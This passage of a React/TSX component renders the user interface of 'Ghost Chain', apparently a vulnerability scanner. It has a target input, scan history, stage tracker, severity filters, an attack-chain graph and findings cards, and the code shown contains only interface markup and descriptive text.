            <h1 className="text-lg font-bold text-primary tracking-tight">Ghost Chain</h1>
            <Badge className="text-[9px] border-[#00ff88]/30 bg-[#00ff88]/10 text-[#00ff88] font-mono uppercase tracking-widest px-1.5">
              Kill Chain AI
            </Badge>
          </div>
          <p className="text-xs text-primary/40 leading-relaxed max-w-xl">
            Automated multi-stage attack surface discovery and kill chain correlation. Finds every exploitable path
            from exposed credentials to full server compromise — and shows exactly how they connect.
          </p>
        </div>
      </div>

      {/* ── Scan Input ────────────────────────────────────────────────── */}
      <div className="border border-primary/20 p-4 rounded-sm bg-primary/2">
        <div className="text-[10px] text-primary/40 uppercase tracking-widest mb-3">Target</div>
        <div className="flex gap-2">
          <div className="flex-1 relative">
            <Target className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-primary/30" />
            <input
              value={target}
              onChange={e => setTarget(e.target.value)}
              onKeyDown={e => { if (e.key === "Enter") handleScan(); }}
              placeholder="example.com or https://app.example.com"
              className="w-full bg-black/40 border border-primary/20 text-primary text-sm font-mono pl-10 pr-4 py-2.5 focus:outline-none focus:border-[#00ff88]/40 placeholder:text-primary/20 rounded-sm"
            />
          </div>
          <Button
            onClick={handleScan}
            disabled={startMut.isPending || !target.trim()}
            className="bg-[#00ff88] hover:bg-[#00ff88]/80 text-black font-bold font-mono text-xs px-5 rounded-sm"
          >
            {startMut.isPending ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Zap className="w-4 h-4 mr-1.5" />Analyze</>}
          </Button>
        </div>
        <div className="mt-2 text-[10px] text-primary/25">
          Runs 5-stage kill chain analysis: surface discovery → fingerprinting → vuln testing → chain correlation → impact assessment
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">

        {/* ── Scan History ─────────────────────────────────────────────── */}
        <div className="lg:col-span-1 space-y-2">
          <div className="text-[10px] text-primary/40 uppercase tracking-widest mb-2">Scan History</div>
          {scans.length === 0 ? (
            <div className="border border-primary/10 p-5 text-center rounded-sm">
              <Search className="w-5 h-5 text-primary/20 mx-auto mb-2" />
              <span className="text-xs text-primary/20">No scans yet</span>
            </div>
          ) : (
            scans.map(scan => (
              <div
                key={scan.id}
                onClick={() => setActiveScanId(scan.id)}
                className={`border p-3 rounded-sm cursor-pointer transition-all ${
                  activeScanId === scan.id
                    ? "border-[#00ff88]/40 bg-[#00ff88]/5"
                    : "border-primary/10 hover:border-primary/20"
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <span className="text-xs font-bold text-primary truncate">{scan.target}</span>
                  <button
                    onClick={e => { e.stopPropagation(); deleteMut.mutate(scan.id); }}
                    className="text-primary/20 hover:text-red-400 transition-colors shrink-0"
                  >
                    <Trash2 className="w-3 h-3" />
                  </button>
                </div>
                <div className="flex items-center gap-2 mt-1">
                  {scan.scanStatus === "running" ? (
                    <span className="flex items-center gap-1 text-[10px] text-yellow-400">
                      <Loader2 className="w-2.5 h-2.5 animate-spin" />Running
                    </span>
                  ) : scan.scanStatus === "complete" ? (
                    <span className="flex items-center gap-1 text-[10px] text-[#00ff88]">
                      <CheckCircle className="w-2.5 h-2.5" />Complete
                    </span>
                  ) : (
                    <span className="text-[10px] text-red-400">Error</span>
                  )}
                  {scan.riskScore != null && (
                    <span className={`text-[10px] font-bold ml-auto ${
                      scan.riskScore >= 60 ? "text-red-400" : scan.riskScore >= 30 ? "text-yellow-400" : "text-[#00ff88]"
                    }`}>Risk {scan.riskScore}</span>
                  )}
                </div>
                <div className="text-[10px] text-primary/25 mt-0.5">
                  {new Date(scan.startedAt).toLocaleString()}
                </div>
              </div>
            ))
          )}
        </div>

        {/* ── Active Scan Results ──────────────────────────────────────── */}
        <div className="lg:col-span-2 space-y-4">
          {!activeScanId ? (
            <div className="border border-primary/10 p-12 text-center rounded-sm">
              <GitMerge className="w-8 h-8 text-primary/15 mx-auto mb-3" />
              <div className="text-sm text-primary/25">Enter a target to begin kill chain analysis</div>
              <div className="text-xs text-primary/15 mt-1">Results appear here as each stage completes</div>
            </div>
          ) : !activeScan ? (
            <div className="border border-primary/10 p-8 text-center rounded-sm">
              <Loader2 className="w-6 h-6 text-primary/30 mx-auto animate-spin" />
            </div>
          ) : (
            <>
              {/* Scan header */}
              <div className="border border-primary/20 p-4 rounded-sm">
                <div className="flex items-start gap-4">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap mb-1">
                      <Globe className="w-4 h-4 text-[#00ff88]" />
                      <span className="text-sm font-bold text-primary">{activeScan.target}</span>
                      <span className={`text-[10px] border px-1.5 py-px rounded-sm font-bold ${
                        activeScan.scanStatus === "running" ? "border-yellow-400/30 text-yellow-400" :
                        activeScan.scanStatus === "complete" ? "border-[#00ff88]/30 text-[#00ff88]" :
                        "border-red-400/30 text-red-400"
                      }`}>
                        {activeScan.scanStatus === "running" ? `${activeScan.currentStage || "Running"}...` :
                         activeScan.scanStatus === "complete" ? "Analysis Complete" : "Error"}
                      </span>
                    </div>
                    {activeScan.summary && (
                      <p className="text-xs text-primary/50 leading-relaxed">{activeScan.summary}</p>
                    )}
                  </div>
                  {activeScan.riskScore != null && (
                    <RiskGauge score={activeScan.riskScore} />
                  )}
                </div>

                {/* Stage tracker */}
                <div className="mt-4 pt-4 border-t border-primary/10">
                  <div className="text-[10px] text-primary/30 uppercase tracking-wider mb-3">Pipeline Progress</div>
                  <StageTracker stages={activeScan.stages || []} />
                </div>
              </div>

              {/* Summary stats */}
              {activeScan.scanStatus === "complete" && findings.length > 0 && (
                <div className="grid grid-cols-5 gap-2">
                  {(["critical", "high", "medium", "low", "info"] as Severity[]).map(sev => (
                    <button
                      key={sev}
                      onClick={() => setFilterSev(filterSev === sev ? "all" : sev)}
                      className={`border rounded-sm p-2 text-center transition-all ${
                        filterSev === sev ? SEV_COLOR[sev] : "border-primary/10 bg-primary/2 hover:border-primary/20"
                      }`}
                    >
                      <div className={`text-xl font-bold font-mono ${filterSev !== sev ? (sevCounts[sev] > 0 ? "text-primary" : "text-primary/20") : ""}`}>
                        {sevCounts[sev]}
                      </div>
                      <div className="text-[9px] uppercase tracking-wide mt-0.5 opacity-60">{sev}</div>
                    </button>
                  ))}
                </div>
              )}

              {/* Attack chain graph */}
              {activeScan.scanStatus === "complete" && chainEdgeCount > 0 && (
                <div className="border border-primary/20 rounded-sm overflow-hidden">
                  <div className="flex items-center justify-between px-4 py-2.5 border-b border-primary/10 bg-primary/3">
                    <div className="flex items-center gap-2">
                      <Network className="w-3.5 h-3.5 text-[#00ff88]" />
                      <span className="text-[11px] font-bold text-primary uppercase tracking-wide">Attack Chain Graph</span>
                      <span className="text-[10px] text-primary/30">{chainEdgeCount} chain{chainEdgeCount !== 1 ? "s" : ""} identified</span>
                    </div>
                  </div>
                  <div className="bg-black/30">
                    <ChainGraphView graph={activeScan.chainGraph} findings={findings} />
                  </div>
                  <div className="px-4 py-2.5 border-t border-primary/10 bg-primary/2">
                    <p className="text-[10px] text-primary/30 leading-relaxed">
                      Arrows show how findings chain into escalating attack paths. A single low-severity finding can become critical
                      when combined with others on the same target.
                    </p>
                  </div>
                </div>
              )}

              {/* Findings list */}
              {findings.length > 0 && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="text-[10px] text-primary/40 uppercase tracking-widest">
                      Findings {filterSev !== "all" && <span className="text-primary/20">— filtered: {filterSev}</span>}
                    </div>
                    {filterSev !== "all" && (
                      <button onClick={() => setFilterSev("all")} className="text-[10px] text-primary/30 hover:text-primary/60">
                        Clear filter
                      </button>
                    )}
                  </div>
                  {filteredFindings.length === 0 ? (
                    <div className="text-xs text-primary/20 text-center py-4">No {filterSev} findings</div>
                  ) : (
                    filteredFindings.map(f => <FindingCard key={f.id} finding={f} />)
                  )}
                </div>
              )}

              {/* No findings */}
              {activeScan.scanStatus === "complete" && findings.length === 0 && (
                <div className="border border-[#00ff88]/20 bg-[#00ff88]/5 p-6 rounded-sm text-center">
                  <CheckCircle className="w-6 h-6 text-[#00ff88] mx-auto mb-2" />
                  <div className="text-sm text-[#00ff88]/80 font-bold">No significant vulnerabilities detected</div>
                  <p className="text-xs text-primary/30 mt-1">Target passed all automated checks. Consider a manual penetration test for comprehensive coverage.</p>
                </div>
              )}
            </>
          )}
        </div>
      </div>

      {/* ── How It Differs ────────────────────────────────────────────── */}
      {!activeScanId && (
        <div className="border border-primary/10 p-4 rounded-sm">
          <div className="text-[10px] text-primary/40 uppercase tracking-widest mb-4">Why Ghost Chain Goes Beyond Traditional Scanners</div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
            {[
              {
                icon: Layers,
                title: "Multi-Stage Pipeline",
                desc: "Not just one test — 5 coordinated stages discover surfaces, fingerprint tech, test vulnerabilities, correlate chains, and assess business impact in one pass.",
              },
              {
                icon: GitMerge,
                title: "Attack Chain Correlation",
                desc: "Individual findings are analyzed together. A leaked .env + an accessible admin panel = full compromise pathway. Ghost Chain shows the complete kill chain.",
              },
              {
                icon: BarChart2,
                title: "Business Impact Framing",
                desc: "Every finding answers 'what can an attacker actually do?' Not just CVSS scores — real-world exploitation consequences are explained in plain language.",
              },
            ].map(s => (
              <div key={s.title} className="flex gap-3">
                <s.icon className="w-4 h-4 text-[#00ff88]/60 shrink-0 mt-0.5" />
                <div>
                  <div className="text-[#00ff88]/80 font-bold text-[11px] uppercase tracking-wide mb-1">{s.title}</div>
                  <span className="text-primary/40 leading-relaxed">{s.desc}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
